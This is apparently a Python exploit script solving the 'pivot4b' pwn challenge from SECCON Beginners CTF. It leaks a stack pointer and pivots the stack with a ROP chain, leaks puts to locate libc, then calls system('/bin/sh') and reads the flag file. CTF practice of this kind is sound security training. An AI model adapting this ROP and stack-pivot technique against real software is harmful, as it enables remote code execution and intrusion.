from ptrlib import *
import os

elf = ELF("./chall")
libc = ELF("./libc.so.6")
#sock = Process("./chall_patched")
sock = Socket(os.getenv("CTF4B_HOST", "pivot4b.challenges.beginners.seccon.jp"), int(os.getenv("CTF4B_PORT", 12300)))

sock.recvuntil("Here's the pointer to message: 0x")
message_addr = int(sock.recvline().strip(), 16)

payload = b""
payload += flat([
    next(elf.gadget("pop rdi; ret")),
    elf.got("puts"),
    elf.plt("puts"),
    next(elf.gadget("ret")),
    elf.symbol("main"),
], map=p64)
payload += p64(0) * ((0x30 - len(payload)) // 8)
payload += p64(message_addr - 8)
payload += p64(next(elf.gadget("leave; ret")))

sock.sendafter("> ", payload)
sock.recvline()
libc.base = u64(sock.recvline()) - libc.symbol("puts")

sock.recvuntil("Here's the pointer to message: 0x")
message_addr = int(sock.recvline().strip(), 16)

payload = b"/bin/sh\x00"
payload += flat([
    next(elf.gadget("pop rdi; ret")),
    message_addr,
    next(elf.gadget("ret")),
    libc.symbol("system"),
], map=p64)

payload += p64(0) * ((0x30 - len(payload)) // 8)

payload += p64(message_addr)
payload += p64(next(elf.gadget("leave; ret")))

sock.sendlineafter("> ", payload)
sock.recvline()
sock.sendline("cat flag-bce7759151aa98ff2e61358f578ec2eb.txt")
sock.sh()
